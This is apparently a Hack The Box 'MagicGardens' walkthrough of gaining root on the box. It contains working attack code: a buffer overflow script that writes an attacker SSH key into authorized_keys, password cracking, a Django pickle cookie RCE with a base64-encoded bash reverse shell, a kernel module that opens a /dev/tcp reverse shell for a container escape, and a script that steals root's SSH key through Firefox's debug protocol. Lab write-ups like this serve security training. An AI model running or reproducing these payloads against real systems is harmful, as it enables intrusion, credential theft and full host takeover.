![](images/Pasted%20image%2020241017105202.png)

```bash
./harvest client 127.0.0.1 # We run the binary to trigger the logging process [*] Connection to 127.0.0.1 1337 port succeeded [*] Successful handshake
```

We send the request which triggers the Suspicious Activity

```bash
└─$ python3 exploit.py Connecting to the Socket... Connected! Sending some testing packets
```

- The filename is 40 bytes in size + 8 for the RBP value ==> 48 . 

- In total we acquire a size of 40 + 65360 = 65400 in terms of memory. So we can be able to simulate some kind of environment for it. 

#### Steps to write:

1. Create the python script

```python
#!/usr/bin/python3

# Import necessary modules
import socket

# Constants
OFFSET = 65372
HEADER = b"HEADERPACKET"  # Exactly 12 bytes
DATA = b"Hello There\n"    # The data to write in the file
FILENAME = b"trash.txt"    # The file to write
HOST = '::1'               # Loopback address (IPv6)
PORT = 7777                # Random port

def create_packet():
    """Create the packet payload for sending."""
    # Start with the header
    packet_payload = HEADER
    
    # Append data to write
    packet_payload += DATA
    
    # Adjusting until the offset
    packet_payload = packet_payload.ljust(OFFSET, b"A") 
    
    # Append the filename
    packet_payload += FILENAME
    
    # Adjusting the filename to fit a specific length
    packet_payload = packet_payload.ljust(40, b"\x00")
    
    return packet_payload

def main():
    """Main function to connect to the server and send the packet."""
    print("Connecting to the Socket...")
    
    # Server address tuple
    server_address = (HOST, PORT)
    
    # Create a socket
    with socket.socket(socket.AF_INET6, socket.SOCK_DGRAM) as s:
        s.connect(server_address)
        print("Connected!")
        
        # Create the packet payload
        packet_payload = create_packet()
        
        print("Sending some testing packets...")
        s.send(packet_payload)

if __name__ == "__main__":
    main()

```

2. Setting up the server in gdb (run as root)!

```bash
sudo gdb harvest
GNU gdb (Debian 15.1-1) 15.1
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from harvest...
(No debugging symbols found in harvest)
(gdb) disass log_packet
Dump of assembler code for function log_packet:
   0x000000000000223b <+0>:     push   %rbp
   0x000000000000223c <+1>:     mov    %rsp,%rbp
   0x000000000000223f <+4>:     sub    $0xffa0,%rsp
   0x0000000000002246 <+11>:    mov    %rdi,-0xff98(%rbp)
   0x000000000000224d <+18>:    mov    %rsi,-0xffa0(%rbp)
   0x0000000000002254 <+25>:    mov    -0xff98(%rbp),%rax
   0x000000000000225b <+32>:    add    $0x4,%rax
   0x000000000000225f <+36>:    movzwl (%rax),%eax
   0x0000000000002262 <+39>:    mov    %ax,-0xff82(%rbp)
   0x0000000000002269 <+46>:    movzwl -0xff82(%rbp),%eax
   0x0000000000002270 <+53>:    movzwl %ax,%eax
   0x0000000000002273 <+56>:    mov    %eax,%edi
   0x0000000000002275 <+58>:    call   0x10c0 <htons@plt>
   0x000000000000227a <+63>:    mov    %ax,-0xff82(%rbp)
   0x0000000000002281 <+70>:    movzwl -0xff82(%rbp),%eax
   0x0000000000002288 <+77>:    test   %ax,%ax
   0x000000000000228b <+80>:    je     0x234f <log_packet+276>
   0x0000000000002291 <+86>:    mov    -0xffa0(%rbp),%rdx
   0x0000000000002298 <+93>:    lea    -0x30(%rbp),%rax
   0x000000000000229c <+97>:    mov    %rdx,%rsi
   0x000000000000229f <+100>:   mov    %rax,%rdi
   0x00000000000022a2 <+103>:   call   0x1040 <strcpy@plt>
   0x00000000000022a7 <+108>:   movzwl -0xff82(%rbp),%eax
   0x00000000000022ae <+115>:   movzwl %ax,%edx
   0x00000000000022b1 <+118>:   mov    -0xff98(%rbp),%rax
   0x00000000000022b8 <+125>:   lea    0x3c(%rax),%rcx
   0x00000000000022bc <+129>:   lea    -0xff80(%rbp),%rax
   0x00000000000022c3 <+136>:   mov    %rcx,%rsi
   0x00000000000022c6 <+139>:   mov    %rax,%rdi
   0x00000000000022c9 <+142>:   call   0x1030 <strncpy@plt>
   0x00000000000022ce <+147>:   movzwl -0xff82(%rbp),%eax
   0x00000000000022d5 <+154>:   movzwl %ax,%eax
   0x00000000000022d8 <+157>:   lea    -0xff80(%rbp),%rdx
   0x00000000000022df <+164>:   add    %rdx,%rax
   0x00000000000022e2 <+167>:   movw   $0xa,(%rax)
--Type <RET> for more, q to quit, c to continue without paging--
   0x00000000000022e7 <+172>:   lea    -0x30(%rbp),%rax
   0x00000000000022eb <+176>:   lea    0x16df(%rip),%rdx        # 0x39d1
   0x00000000000022f2 <+183>:   mov    %rdx,%rsi
   0x00000000000022f5 <+186>:   mov    %rax,%rdi
   0x00000000000022f8 <+189>:   call   0x11b0 <fopen@plt>
   0x00000000000022fd <+194>:   mov    %rax,-0x8(%rbp)
   0x0000000000002301 <+198>:   cmpq   $0x0,-0x8(%rbp)
   0x0000000000002306 <+203>:   jne    0x2319 <log_packet+222>
   0x0000000000002308 <+205>:   lea    0x16c4(%rip),%rax        # 0x39d3
   0x000000000000230f <+212>:   mov    %rax,%rdi
   0x0000000000002312 <+215>:   call   0x1050 <puts@plt>
   0x0000000000002317 <+220>:   jmp    0x234f <log_packet+276>
   0x0000000000002319 <+222>:   lea    -0xff80(%rbp),%rdx
   0x0000000000002320 <+229>:   mov    -0x8(%rbp),%rax
   0x0000000000002324 <+233>:   mov    %rdx,%rsi
   0x0000000000002327 <+236>:   mov    %rax,%rdi
   0x000000000000232a <+239>:   mov    $0x0,%eax
   0x000000000000232f <+244>:   call   0x1150 <fprintf@plt>
   0x0000000000002334 <+249>:   mov    -0x8(%rbp),%rax
   0x0000000000002338 <+253>:   mov    %rax,%rdi
   0x000000000000233b <+256>:   call   0x1090 <fclose@plt>
   0x0000000000002340 <+261>:   lea    0x1699(%rip),%rax        # 0x39e0
   0x0000000000002347 <+268>:   mov    %rax,%rdi
   0x000000000000234a <+271>:   call   0x1050 <puts@plt>
   0x000000000000234f <+276>:   mov    $0x0,%eax
   0x0000000000002354 <+281>:   leave
   0x0000000000002355 <+282>:   ret
End of assembler dump.
(gdb)  r server -l logs/harvest.log
Starting program: /home/mindflare/Desktop/HTB/MagicGarden/Harvest/harvest server -l logs/harvest.log
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[*] Listening on interface ANY
[*] Successful handshake
[!] Suspicious activity. Packages have been logged.
[!] Suspicious activity. Packages have been logged.
Bad log file

```

3. Run the exploit and the harvest client

```python
 python3 exploit.py
Connecting to the Socket...
Connected!
Sending some testing packets
```

```bash
./harvest client 127.0.0.1
```

4. Investigate the result (You may have a false packet, just continue until you do [n]ext step )
```bash
$ ls
Dir.gpr  Dir.lock  Dir.lock~  Dir.rep  env  exploit.py  harvest  trash.txt
```

```bash
cat trash.txt | head -n 1
Hello There
```

![](images/Pasted%20image%2020241017103130.png)

We see that it works (the filename is overwritten).

We acquire the file and the overwritten text. We can then generate the exploit and change the script to accommodate everything.

1. Generate public/private key for Alex.

```bash
ssh-keygen -t ed25519 -f alex_key
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in alex_key
Your public key has been saved in alex_key.pub
The key fingerprint is:
SHA256:TpwVWlcU+Wp8Ue4cEnQCklDagOgq/Tnmh979QhysykY mindflare@Mindflare
The key's randomart image is:
+--[ED25519 256]--+
|    . .ooo+.+=++ |
|   . .  ++.o .+ .|
|  .    o...   .o.|
|   .   .oo   . oo|
| ..    oS.   ..+o|
|... E .oo     + +|
|.  + + ..    . . |
|    X....        |
|   =oo. .o.      |
+----[SHA256]-----+
```

2. Modify the exploit.py file to write our public key.
```python
#!/usr/bin/python3
# Modules for import
import socket

# Variables
offset = 65372
filename = b"/home/alex/.ssh/authorized_keys"
# Your public key content
public_key = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIrpGbsRB01YtPl6zCbpOUCZTOJli0mIdxpeOW+Ac1Sl mindflare@Mindflare\n"

# Create the packet payload
packet_payload = b"HEADERPACKET"  # Exactly 12 bytes
packet_payload += public_key        # The public key to write in the file
packet_payload = packet_payload.ljust(offset, b"\x0a")  # Adjusting till the offset
packet_payload += filename           # The file to write
packet_payload = packet_payload.ljust(40, b"\x00")  # Adjusting the filename

# Socket setup
HOST = '0:0:0:0:0:0:0:1'
PORT = 7777  # Random port
print("Connecting to the Socket...")
server = (HOST, PORT)
s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
s.connect(server)
print("Connected!")
print("Sending some testing packets")
s.send(packet_payload)
s.close()
```

3. Using scp copy the file to /tmp and run the harvest client

```bash
scp exploit.py morty@magicgardens.htb:/tmp/exploit.py && ./harvest client 10.10.11.9
```
![](images/Pasted%20image%2020241017104232.png)

4. Run the exploit.py from morty (the harvest client stops running immediately.):
```
morty@magicgardens:/tmp$  ls -la | grep exploit
-rw-r--r--  1 morty morty  938 Oct 17 01:09 exploit.py
morty@magicgardens:/tmp$ python3 exploit.py
Connecting to the Socket...
Connected!
Sending some testing packets
```

![](images/Pasted%20image%2020241017104304.png)

5. Check the SSH using alex:

```bash
chmod 600 alex_key
```

```bash
┌──(mindflare㉿Mindflare)-[~/Desktop/HTB/MagicGarden]
└─$ ssh -i alex_key alex@10.10.11.9    
Linux magicgardens 6.1.0-20-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.85-1 (2024-04-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Fri May 24 08:05:34 2024 from 10.10.14.40
alex@magicgardens:~$ id
uid=1000(alex) gid=1000(alex) groups=1000(alex),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),110(bluetooth)
alex@magicgardens:~$ ls
user.txt
alex@magicgardens:~$ 
```

Here we can see we successfully logged in as alex.

Now during linpeas enumeration i see alex has  had mail :

```bash
alex@magicgardens:~$  cat /var/mail/alex 
From root@magicgardens.magicgardens.htb  Fri Sep 29 09:31:49 2023
Return-Path: <root@magicgardens.magicgardens.htb>
X-Original-To: alex@magicgardens.magicgardens.htb
Delivered-To: alex@magicgardens.magicgardens.htb
Received: by magicgardens.magicgardens.htb (Postfix, from userid 0)
        id 3CDA93FC96; Fri, 29 Sep 2023 09:31:49 -0400 (EDT)
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="1804289383-1695994309=:37178"
Subject: Auth file for docker
To: <alex@magicgardens.magicgardens.htb>
User-Agent: mail (GNU Mailutils 3.15)
Date: Fri, 29 Sep 2023 09:31:49 -0400
Message-Id: <20230929133149.3CDA93FC96@magicgardens.magicgardens.htb>
From: root <root@magicgardens.magicgardens.htb>

--1804289383-1695994309=:37178
Content-Type: text/plain; charset=UTF-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
Content-ID: <20230929093149.37178@magicgardens.magicgardens.htb>

Use this file for registry configuration. The password is on your desk

--1804289383-1695994309=:37178
Content-Type: application/octet-stream; name="auth.zip"
Content-Disposition: attachment; filename="auth.zip"
Content-Transfer-Encoding: base64
Content-ID: <20230929093149.37178.1@magicgardens.magicgardens.htb>

UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE
6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S
q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe
AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG
ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=
--1804289383-1695994309=:37178--
```

The content of the email  contains a multipart message from the root user, along with a base64-encoded attachment (`auth.zip`).

##### Decoding the Attachment

We see the file is a `base64` encoded form of `auth.zip` , we can write to a file:

The file appears to be encrypted with a password. We can extract the hash using zip2john.

```bash
/opt/john/run/zip2john auth.zip >> file_hash ver 1.0 efh 5455 efh 7875 auth.zip/htpasswd PKZIP Encr: 2b chk, TS_chk, cmplen=84, decmplen=72, crc=B238A674 ts=A86E cs=a86e type=0 ┌──(pyp㉿Ghost)-[~/…/Active/MagicGardens/www/Alex-Root] └─$ sudo /opt/john/run/john file_hash --show auth.zip/htpasswd:realmadrid:htpasswd:auth.zip::auth.zip 1 password hashes cracked, 0 left
```

We can then extract the htpasswd and we can then crack the bcrypt hash: file from the auth.zip:

```bash
hashcat -a 0 -m 3200 htpasswd /usr/share/wordlists/rockyou.txt --user -- show AlexMiles:$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq:diamonds
```

We acquire the password for the Docker configuration (the Registry) and we can try to authenticate on the server using the following repo: 
https://github.com/Syzik/DockerRegistryGrabber.

We try to ensure the credentials worked.

```bash
curl -k -u 'AlexMiles:diamonds' https://10.10.11.9:5000/v2/_catalog

{"repositories":["magicgardens.htb"]}
```

```python
./drg.py https://magicgardens.htb -U alex -P diamonds --dump magicgardens.htb  
/home/mane/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (5.1.0)/charset_normalizer (2.0.9) doesn't match a supported version!  
warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "  
[+] BlobSum found 30  
[+] Dumping magicgardens.htb  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c  
[+] Downloading : 748da8c1b87e668267b90ea305e2671b22d046dcfeb189152bf590d594c3b3fc  
[+] Downloading : 81771b31efb313fb18dae7d8ca3a93c8c4554aa09239e09d61bbbc7ed58d4515  
[+] Downloading : 35b21a215463f8130302987a1954d01a8346cdd82c861d57eeb3cfb94d6511a8  
[+] Downloading : 437853d7b910e50d0a0a43b077da00948a21289a32e6ce082eb4d44593768eb1  
[+] Downloading : f9afd820562f8d93873f4dfed53f9065b928c552cf920e52e804177eff8b2c82  
[+] Downloading : d66316738a2760996cb59c8eb2b28c8fa10a73ce1d98fb75fda66071a1c659d6  
[+] Downloading : fedbb0514db0150f2376b0f778e5f304c302b53619b96a08824c50da7e3e97ea  
[+] Downloading : 480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb  
[+] Downloading : 02cea9e48b60ccaf6476be25bac7b982d97ef0ed66baeb8b0cffad643ece37d5  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : 8999ec22cbc0ab31d0e3471d591538ff6b2b4c3bbace9c2a97e6c68844382a78  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : 470924304c244ba833543bb487c73e232fd34623cdbfa51d30eab30ce802a10d  
[+] Downloading : 4bc8eb4a36a30acad7a56cf0b58b279b14fce7dd6623717f32896ea748774a59  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : 9c94b131279a02de1f5c2eb72e9cda9830b128840470843e0761a45d7bebbefe  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : c485c4ba383179db59368a8a4d2df3e783620647fe0b014331c7fd2bd8526e5b  
[+] Downloading : 9b1fd34c30b75e7edb20c2fd09a9862697f302ef9ae357e521ef3c84d5534e3f  
[+] Downloading : d31b0195ec5f04dfc78eca9d73b5d223fc36a29f54ee888bc4e0615b5839e692  
[+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4  
[+] Downloading : de4cac68b6165c40cf6f8b30417948c31be03a968e233e55ee40221553a5e570
```

Then we get a bunch of layers:

```
$ ls  
02cea9e48b60ccaf6476be25bac7b982d97ef0ed66baeb8b0cffad643ece37d5.tar.gz 9c94b131279a02de1f5c2eb72e9cda9830b128840470843e0761a45d7bebbefe.tar.gz  
35b21a215463f8130302987a1954d01a8346cdd82c861d57eeb3cfb94d6511a8.tar.gz a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz  
437853d7b910e50d0a0a43b077da00948a21289a32e6ce082eb4d44593768eb1.tar.gz b0c11cc482abe59dbeea1133c92720f7a3feca9c837d75fd76936b1c6243938c.tar.gz  
470924304c244ba833543bb487c73e232fd34623cdbfa51d30eab30ce802a10d.tar.gz c485c4ba383179db59368a8a4d2df3e783620647fe0b014331c7fd2bd8526e5b.tar.gz  
480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb.tar.gz d31b0195ec5f04dfc78eca9d73b5d223fc36a29f54ee888bc4e0615b5839e692.tar.gz  
4bc8eb4a36a30acad7a56cf0b58b279b14fce7dd6623717f32896ea748774a59.tar.gz d66316738a2760996cb59c8eb2b28c8fa10a73ce1d98fb75fda66071a1c659d6.tar.gz  
748da8c1b87e668267b90ea305e2671b22d046dcfeb189152bf590d594c3b3fc.tar.gz de4cac68b6165c40cf6f8b30417948c31be03a968e233e55ee40221553a5e570.tar.gz  
81771b31efb313fb18dae7d8ca3a93c8c4554aa09239e09d61bbbc7ed58d4515.tar.gz f9afd820562f8d93873f4dfed53f9065b928c552cf920e52e804177eff8b2c82.tar.gz  
8999ec22cbc0ab31d0e3471d591538ff6b2b4c3bbace9c2a97e6c68844382a78.tar.gz fedbb0514db0150f2376b0f778e5f304c302b53619b96a08824c50da7e3e97ea.tar.gz  
9b1fd34c30b75e7edb20c2fd09a9862697f302ef9ae357e521ef3c84d5534e3f.tar.gz
```

After dumping the image, we can enumerate one of the files:

```bash
tar -xzf 02cea9e48b60ccaf6476be25bac7b982d97ef0ed66baeb8b0cffad643ece37d5.tar.gz ┌──(pyp㉿Ghost)- [~/…/MagicGardens/www/DockerRegistryGrabber/magicgardens.htb] └─$ ls -la total 472300 drwxrwxr-x 3 pyp pyp 4096 Jun 1 12:26 . drwxrwxr-x 6 pyp pyp 4096 May 19 16:29 .. -rw-rw-r-- 1 pyp pyp 140 Jun 1 12:30 It appears to hold the source code for the Django application; If it has the SECRET key inside the source code then we may be able to do some serious damage. We see that the SECRET_KEY is clearly visible, we can be able to exploit a deserialiastion protocol in the cookie format and be able to execute commands from the docker configuration. Django's secrets Using the following repo: https://github.com/0xuf/DJRCE, we clone it and follow the instructions. 02cea9e48b60ccaf6476be25bac7b982d97ef0ed66baeb8b0cffad643ece37d5.tar.gz [SNIPPEd] drwxr-xr-x 3 pyp pyp 4096 Aug 14 2023 usr
```

After getting three, I unzipped the first one 480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb.tar.gz​ and saw the .env file inside.

```bash
$ cat .env  
DEBUG=False  
SECRET_KEY=55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b
```

We see that the `SECRET_KEY` is clearly visible, we can be able to exploit a `deserialiastion` protocol in the cookie format and be able to execute commands from the docker configuration.

#### Django's secrets 

Using the following repo: https://github.com/0xuf/DJRCE, we clone it and follow the instructions.

```bash
from django.contrib.sessions.serializers import PickleSerializer  
from django.core import signing  
from django.conf import settings  
  
settings.configure(SECRET_KEY="55A6cc8e2b8#ae1662c34)618U549601$7eC3f0@b1e8c2577J22a8f6edcb5c9b80X8f4&87b")  
  
  
class CreateTmpFile(object):  
def __reduce__(self):  
import subprocess  
return (subprocess.call,  
(['bash',  
'-c','echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOS8xMTExIDA+JjEnCg== | base64 -d | bash'],))  
  
  
sess = signing.dumps(  
obj=CreateTmpFile(),  
serializer=PickleSerializer,  
salt='django.contrib.sessions.backends.signed_cookies'  
)  
  
  
print(sess)
```

Note: in the above script this line 
`echo L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuOS8xMTExIDA+JjEnCg==` 

is base 64 encoded to get the reverse shell, change it according to your ip.

Running the above script give us output like this:

![](images/Pasted%20image%2020241017133942.png)

Now simply put this in place of sessionid to get the shell:

![](images/Pasted%20image%2020241017134022.png)

```bash
nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.9] 57098
bash: cannot set terminal process group (17): Inappropriate ioctl for device
bash: no job control in this shell
root@5e5026ac6a81:/usr/src/app# ls
ls
app
db.sqlite3
entrypoint.sh
manage.py
media
requirements.txt
static
store
root@5e5026ac6a81:/usr/src/app# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Here we can see We get root on the docker container!

#### root@5e5026ac6a81

Since we are on the docker container, we can try a docker breakout: We first check the capabilties:

```bash
root@5e5026ac6a81:/usr/src/app# getpcaps $$ getpcaps $$ 1249: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_set uid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chro ot,cap_audit_write,cap_setfcap=ep
```

We see we have the `cap_sys_module capability`; with this we can be able to insert/remove `kernel modules` in/from the kernel of the host machine and hence be able to do a privilege escalation (the modules on the host , the new one, will be run and hence any command in the new module runs as root on the host ) Following the following post: https://www.cyberark.com/resources/threat-research-blog/how-ihacked-play-with-docker-and-remotely-ran-code-on-the-host, I am able to acquire a reverse shell as root.

**Steps:**

##### Create the C Source File for the Kernel Module

Create a file named `sys_module_reverse-shell.c` with the following content:

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("H4ck3r");
MODULE_DESCRIPTION("Reverse shell module");
MODULE_VERSION("1.0");

// Update the IP and port below to your attacker's IP and listening port
char* argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.11.8/1111 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

// Initialize the reverse shell when the module is loaded
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

// Cleanup function when the module is removed
static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Reverse shell module removed\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

##### Create the Makefile for Compiling the Module

Create a file named `Makefile` in the same directory with the following content:

```c
obj-m += sys_module_reverse-shell.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

```

##### Compile the Kernel Module in root docker shell

```bash
root@5e5026ac6a81:/usr/src/app# make
make
make -C /lib/modules/6.1.0-20-amd64/build M=/usr/src/app modules
make[1]: Entering directory '/usr/src/linux-headers-6.1.0-20-amd64'
  CC [M]  /usr/src/app/sys_module_reverse-shell.o
  MODPOST /usr/src/app/Module.symvers
  CC [M]  /usr/src/app/sys_module_reverse-shell.mod.o
  LD [M]  /usr/src/app/sys_module_reverse-shell.ko
  BTF [M] /usr/src/app/sys_module_reverse-shell.ko
Skipping BTF generation for /usr/src/app/sys_module_reverse-shell.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-6.1.0-20-amd64'
```

This will produce a file named `sys_module_reverse-shell.ko`, which is the compiled kernel module.

Now Transfer both Makefile and sys_module_reverse-shell.c in root shell.

### Insert the Kernel Module

Once the kernel module is compiled, insert it using the `insmod` command to load it into the kernel.

```bash
root@5e5026ac6a81:/usr/src/app# insmod sys_module_reverse-shell.ko
insmod sys_module_reverse-shell.ko
root@5e5026ac6a81:/usr/src/app# 
```

Make sure your local machine is listening on the specified port to catch the reverse shell:

```bash
nc -lvnp 1111                               
listening on [any] 1111 ...
connect to [10.10.14.88] from (UNKNOWN) [10.10.11.9] 46220
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@magicgardens:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Here we can see in this way we get root user!

I remember working on this particular box was quite challenging, especially towards the end. By the time I finished, I hadn't even started writing up the enumeration part. Given the complexity, I decided to begin with the privilege escalation steps first. There were numerous steps involved, each requiring meticulous precision. I've simplified some parts, particularly the binary exploitation, which took one days to develop and yet can't fully understand.

#### Important Links
Links and references
https://github.com/Syzik/DockerRegistryGrabber -> Github repo for Docker Registry Grabber.

https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry ->
Pentesting Docker Registry
https://hackerone.com/reports/1415436 -> Hacker One report on Django RCE

https://github.com/0xuf/DJRCE -> Github repository for Django RCE

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linuxcapabilities#cap_sys_module -> Cap sys module exploitation on the docker machine

#### Unintended Paths:

This boxes has many unintended paths that's why root flag came first then user by `xct`.

The first unintended path was the `smtp` port at the time of doing this box the smtp is showing in filter state and if i try to run tools it saying connection error , But when the smtp is open we can perform `SMTP User Blasting` . We can use `msfconsole ` for this:

From there we get to know there is a user `alex` and after that we try to Bruteforce it with hydra for the Docker registry . 

After that we have to dump the docker img container just we do and in `/usr/src/app` we get
`db.sqlite3` file. Using sqlite3  we get morty user pass:

The another unintended path was from Morty (before the path), `firefox` was running in `debug mode as root` . This allows us to connect to the chrome developer tool protocol to be able to read files. The following script (from v0lk3n can be utilised):

```python
import json
import requests
import websocket
import base64
import PyPDF2
import os

# Step 1: Retrieve Debugging Information
debugger_address = 'http://localhost:34965/json'
response = requests.get(debugger_address)
tabs = response.json()

# Step 2: Extract WebSocket Debugger URL
web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1', 'localhost')

# Step 3: Connect to WebSocket Debugger with verbose logging
ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True, header=["User-Agent: Firefox"])
print("Connected to WebSocket Debugger.")

# Step 4: Create Target
create_target_command = json.dumps({
    "id": 1,
    "method": "Target.createTarget",
    "params": {
        "url": "file:///root/.ssh/id_rsa"
    }
})
ws.send(create_target_command)
print("Create target command sent.")
result = json.loads(ws.recv())
target_id = result['result']['targetId']

# Step 5: Attach to Target
attach_command = json.dumps({
    "id": 2,
    "method": "Target.attachToTarget",
    "params": {
        "targetId": target_id,
        "flatten": True
    }
})
ws.send(attach_command)
print("Attach command sent.")
session_id = json.loads(ws.recv())['result']['sessionId']

# Step 6: Capture Page Content as PDF
capture_command = json.dumps({
    "id": 3,
    "method": "Page.printToPDF",
    "params": {
        "landscape": False,
        "displayHeaderFooter": False,
        "printBackground": True,
        "preferCSSPageSize": True
    }
})
ws.send(capture_command)
print("Capture page content command sent.")
result = json.loads(ws.recv())

# Check if 'result' contains the PDF data
if 'result' in result and 'data' in result['result']:
    pdf_data = base64.b64decode(result['result']['data'])
    # Step 7: Save Page Content as PDF
    with open("page_content.pdf", "wb") as pdf_file:
        pdf_file.write(pdf_data)
    print("Page content saved as PDF.")

    # Step 8: Convert PDF to Text
    with open("page_content.pdf", "rb") as pdf_file:
        reader = PyPDF2.PdfReader(pdf_file)
        page = reader.pages[0]
        text = page.extract_text()

    # Output the extracted text
    print("Extracted text:")
    print(text)

    # Step 9: Save the extracted text to id_rsa file
    with open("id_rsa", "w") as id_rsa_file:
        id_rsa_file.write(text + '\n')
    print("Extracted text saved to id_rsa file.")

    # Step 10: Change permissions of id_rsa file to 600
    os.chmod("id_rsa", 0o600)
    print("Permissions of id_rsa file changed to 600.")

    # Step 11: Run SSH command
    print("SSH Connection to magicgardens root user...")
    os.system("ssh -i id_rsa root@magicgardens.htb")
else:
    print("Error: PDF data not found in the result.")

# Step 12: Close WebSocket Connection
ws.close()
print("WebSocket connection closed.")
```

Through this we get root ssh shell directly but fortunately or unfortunately this is patched now.
